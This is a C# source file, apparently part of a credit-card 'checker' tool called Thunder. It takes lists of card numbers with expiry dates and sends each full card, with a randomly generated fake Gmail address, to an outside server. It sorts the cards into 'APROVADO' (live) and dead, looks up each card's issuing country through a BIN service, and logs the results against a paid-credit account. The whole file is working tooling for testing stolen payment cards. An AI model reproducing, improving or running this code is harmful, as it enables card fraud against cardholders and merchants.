using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using RestSharp;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Gate8
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

  

   
        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run)
            {
                try
                {
                    Thunder._Form1.update_progresbar(10);
                    string cc = Thunder._Form1.nextCc();
                    string[] ccLine = cc.Split('|');
                    var ccnum = ccLine[0];
                    var mes = ccLine[1];
                    var anio = ccLine[2].Remove(0,2);
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    var client = new RestClient("http://3.12.239.104/thu/ec.php?cc="+cc.Trim()+"&correo="+correo);
                    client.Timeout = -1;
                    var request = new RestRequest(Method.GET);
                    IRestResponse response = client.Execute(request);
                    Console.WriteLine(response.Content);
                    Thunder._Form1.update_progresbar(50);
                    dynamic resp = JsonConvert.DeserializeObject(response.Content);
                    string code = resp.status;

                    if(code== "OK")
                    {
                        Thunder._Form1.update_progresbar(100);
                        var pais = checkbin(cc.Substring(0, 6));
                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                        check.ccss(Variables.key, guardar, "lives");
                        Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                        check.playlive();
                        Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                        Thunder._Form1.remove_cc(0, cc.Length);
                        numeroTargeta++;
                        pagos++;
                        Thread.Sleep(20000);
                        load();
                    }
                    else
                    {
                        var pais = "";
                        Thunder._Form1.update_progresbar(100);
                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                        check.ccss(Variables.key, guardar, "deads");
                        Thread.Sleep(300);
                        Thunder._Form1.agragar_dead(cc);
                        Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                        Thunder._Form1.remove_cc(0, cc.Length);
                        numeroTargeta++;
                        pagos++;
                        Thread.Sleep(15000);
                        load();
                    }



                }
                catch (Exception ex)
                {

                    if (Variables.run == true)
                    {
                        load();
                    }
                }

            }
        }

  



    }
}

